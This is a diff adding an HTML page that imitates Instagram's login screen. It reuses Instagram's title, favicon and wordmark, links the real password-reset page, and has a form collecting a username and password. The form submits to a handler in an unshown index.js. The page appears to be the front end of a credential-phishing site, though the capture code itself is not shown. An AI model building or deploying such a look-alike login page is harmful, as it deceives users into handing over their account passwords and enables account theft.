@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en" ng-app="myApp">
+<head>
+    <meta charset="UTF-8">
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <script src="index.js"></script>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <link rel="shortcut icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
+    <title>Login.Instagram</title>
+</head>
+<body>
+<div ng-controller="myCtrl">
+    <div class="well login-box center-block" ng-if="showInsta">
+        <img class="logo" src="http://www.dallasarboretum.org/assets/img/instagram-word.png"></img>
+        <form name="login" ng-submit="submit(user)">
+            <div class="form-group">
+                <input type="text" class="form-control" placeholder="Phone number, email or username" ng-minlength="5"
+                       name="userid" ng-model="user.name" required/>
+            </div>
+            <div class="form-group">
+                <input type="password" class="form-control" id="pass" placeholder="Password" ng-minlength="5" name="pswrd" ng-model="user.pwd" required/>
+            </div>
+
+            <input class="btn btn-primary custom-btn" type="submit" value="Log in" ng-disabled="login.$invalid"/>
+            <p class="forget">Forgot your login details? <span class=""><a href="https://www.instagram.com/accounts/password/reset/" target="_blank" class="bold">Get help signing in</a></span></p>
+
+        </form>
+    </div>
+</div>
+
+</body>
+</html>
